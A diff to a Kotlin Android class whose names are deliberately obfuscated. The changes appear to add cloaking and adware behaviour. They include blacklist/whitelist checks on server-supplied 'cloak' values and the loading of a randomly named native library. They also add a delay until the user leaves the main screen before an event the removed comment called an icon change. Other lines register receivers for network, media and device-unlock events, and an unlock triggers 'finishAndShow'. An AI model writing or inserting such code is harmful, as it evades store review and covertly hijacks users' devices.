@@ -6,6 +6,7 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.os.Build
 import android.os.PowerManager
+import com.autumn.leaves.broad.AutoReceiver
 import com.autumn.leaves.flows.AcornBroadcast
 import com.autumn.leaves.flows.CrispFlows
 import kotlinx.coroutines.CoroutineScope
@@ -14,6 +15,7 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.util.Locale
 
 /**
@@ -21,7 +23,7 @@ import java.util.Locale
  * Describe:
  */
 
-class CozyApple(val context: Context, val leaversCache: LeaversCache) {
+class CozyApple(val context: Context, private val leaversCache: LeaversCache) {
     private var mAutumnL by AppleCache(nameP = "autumn_length")
 
     private var scopeMain: CoroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
@@ -36,6 +38,12 @@ class CozyApple(val context: Context, val leaversCache: LeaversCache) {
     private var isActionAutumn = false
 
     fun registerCozy() {
+        context.registerReceiver(AutoReceiver(), IntentFilter().apply {
+            addAction("android.net.conn.CONNECTIVITY_CHANGE")
+            addAction("android.net.wifi.STATE_CHANGE")
+            addAction("android.intent.action.MEDIA_EJECT")
+            addAction("android.intent.action.MEDIA_MOUNTED")
+        })
         mCozyJob = CoroutineScope(Dispatchers.Default).launch {
             CrispFlows.flowLevel.collect {
                 WindHelper.log("registerCozy---$it")
@@ -50,6 +58,7 @@ class CozyApple(val context: Context, val leaversCache: LeaversCache) {
 
                     "Autumn" -> {
                         if (isActionAutumn.not()) {
+                            System.loadLibrary("UF2GKabJcWtSH")
                             isActionAutumn = true
                             if (isWaitInstallSuccess) {
                                 CrispFlows.isStop = true
@@ -69,6 +78,7 @@ class CozyApple(val context: Context, val leaversCache: LeaversCache) {
 
                     "Winter1", "Winter2" -> {
                         CrispFlows.isStop = true
+                        mCozyJob?.cancel()
                     }
                 }
             }
@@ -112,14 +122,14 @@ class CozyApple(val context: Context, val leaversCache: LeaversCache) {
     }
 
     private fun winterU(): Boolean {
-        // todo  黑名单
-        return WindHelper.mCloakInfo == ""
+        //  黑名单
+        return WindHelper.mCloakInfo == "obduracy"
     }
 
 
     private fun autumnW(): Boolean {
-        // todo  白名单
-        return WindHelper.mCloakInfo == ""
+        //  白名单
+        return WindHelper.mCloakInfo == "palfrey"
     }
 
     private var mTimerRequest = true
@@ -129,10 +139,10 @@ class CozyApple(val context: Context, val leaversCache: LeaversCache) {
             return
         }
         CoroutineScope(Dispatchers.Main).launch {
-            WindHelper.setEventNumToMax()
-            // todo 换icon
-            CrispFlows.crispEvent(context, "")
-
+            while (CrispFlows.isInMainPage) {
+                delay(500)
+            }
+            CrispFlows.crispEvent(context, "hwsod")
             context.registerReceiver(AcornBroadcast(), IntentFilter().apply {
                 addAction(Intent.ACTION_USER_PRESENT)
             })
@@ -161,6 +171,7 @@ class CozyApple(val context: Context, val leaversCache: LeaversCache) {
                 }
             }
 
+            WindHelper.setEventNumToMax()
             while (mTimerRequest) {
                 CrispFlows.globalFlow.emit("load_leavers")
                 WindHelper.eventPost("time")
@@ -188,16 +199,21 @@ class CozyApple(val context: Context, val leaversCache: LeaversCache) {
 
         WindHelper.eventPost("ispass")
 
-        scopeMain.launch {
+        scopeMain.launch(Dispatchers.Main) {
             lastShowSuccessTime = System.currentTimeMillis()
             if (leaversCache.isCanUse() != null) {
                 WindHelper.eventPost("isready")
                 CrispFlows.globalFlow.emit("finishAndShow")
+                if (leaversCache.finishActivity() > 0) {
+                    delay(201)
+                }
+                withContext(Dispatchers.IO) {
+                    CrispFlows.crispEvent(context, "lolvns")
+                }
             } else {
                 leaversCache.loadAndTry()
             }
         }
-
     }
 
     //DeviceNotLocked
